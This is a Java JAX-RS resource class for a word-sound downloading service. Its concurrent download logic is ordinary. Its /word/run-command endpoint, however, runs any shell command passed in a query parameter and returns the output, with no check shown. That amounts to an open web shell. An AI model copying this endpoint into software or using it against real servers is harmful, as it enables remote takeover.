package home.resource;

import home.entity.Word;
import home.service.WordDownloadingService;
import org.apache.commons.io.IOUtils;
import org.apache.cxf.jaxrs.impl.MetadataMap;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import javax.inject.Inject;
import javax.ws.rs.GET;
import javax.ws.rs.POST;
import javax.ws.rs.Path;
import javax.ws.rs.PathParam;
import javax.ws.rs.Produces;
import javax.ws.rs.QueryParam;
import javax.ws.rs.core.Context;
import javax.ws.rs.core.MediaType;
import javax.ws.rs.core.MultivaluedMap;
import javax.ws.rs.core.UriInfo;
import java.io.IOException;
import java.lang.reflect.Array;
import java.util.Arrays;
import java.util.HashMap;
import java.util.LinkedHashMap;
import java.util.LinkedList;
import java.util.List;
import java.util.Map;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.Future;

@Path("/word")
public class WordResource {
    private final Logger logger = LoggerFactory.getLogger(WordResource.class);

    private final String[] internalWords = {"correct", "lovely", "beautiful", "yes", "try", "again"};

    @Inject
    private WordDownloadingService wordDownloadingService;

    @POST
    @Produces(MediaType.APPLICATION_JSON)
    @Path("/save-all-words")
    public Map<String, List<Word>> saveAllWords(MultivaluedMap<String, String> wordListMap) {
        for (String internalWord : internalWords) {
            wordDownloadingService.fetchSound(internalWord);
        }

        @SuppressWarnings("unchecked")
        Future<Word>[] futureWords = (Future<Word>[])Array.newInstance(Future.class, 4);

        Map<String, List<Word>> result = new LinkedHashMap<>();
        for (Map.Entry<String, List<String>> entry : wordListMap.entrySet()) {
            List<Word> words = new LinkedList<>();

            for (String text : entry.getValue()) {
                int i = findEmptyOrCompleteFuture(futureWords);
                if (i < 0) {           // there's no null element nor complete future, so use regular download
                    words.add(wordDownloadingService.fetchSound(text));
                }
                else if (futureWords[i] == null) {
                    futureWords[i] = wordDownloadingService.fetchSoundAsynchronously(text);
                }
                else {                 // futureWords[i].isDone
                    try {
                        words.add(futureWords[i].get());
                        futureWords[i] = wordDownloadingService.fetchSoundAsynchronously(text);
                    }
                    catch (InterruptedException | ExecutionException ex) {
                        ex.printStackTrace();
                    }
                }
            }

            // at this point, we might still have some tasks in futureWords, so we have to wait for them
            for (Future<Word> futureWord : futureWords) {
                if (futureWord != null) {
                    try {
                        words.add(futureWord.get());
                    }
                    catch (InterruptedException | ExecutionException ex) {
                        logger.error("unsolvable error", ex);
                    }
                }
            }
            reset(futureWords);
            result.put(removeEndSquareBrackets(entry.getKey()), words);
        }
        return result;
    }

    @GET
    @Produces(MediaType.APPLICATION_JSON)
    @Path("/run-command")
    public Map<String, String> runCommand(@QueryParam("command") String command) {
        final Map<String, String> result = new HashMap<>(2);
        try {
            Process process = Runtime.getRuntime().exec(command);
            result.put("anything", IOUtils.toString(process.getInputStream()));
        }
        catch (IOException ex) {
            result.put("anything", ex.getMessage());
        }
        return result;
    }

    private void reset(Future<Word>[] futures) {
        for (int i = 0; i < futures.length; i++) {
            futures[i] = null;
        }
    }

    /*
     * returns the index of the element which is null or isDone. If not found, returns a negative number.
     */
    private int findEmptyOrCompleteFuture(Future<Word>[] futures) {
        if (futures == null) {
            return -1;
        }
        int n = futures.length;
        for (int i = 0; i < n; i++) {
            if (futures[i] == null) {
                return i;
            }
            else if (futures[i].isDone()) {
                return i;
            }
        }
        return -1;
    }

    // removes "[]" at the end
    private String removeEndSquareBrackets(String s) {
        if (s == null) {
            return null;
        }
        if (s.endsWith("[]")) {
            return s.substring(0, s.length() - 2);
        }
        return s;
    }

    @GET
    @Produces("application/json")
    @Path("/test-jaxrs/{something}")
    public MultivaluedMap<String, String> getMultiValueMap(@PathParam("something") String something) {
        MultivaluedMap<String, String> result = new MetadataMap<>();
        result.put("key 1", Arrays.asList("value 1 for key1", "value 2 for key1"));
        result.put("xyz", Arrays.asList("abc", "def", "mnp", something));
        return result;
    }
}
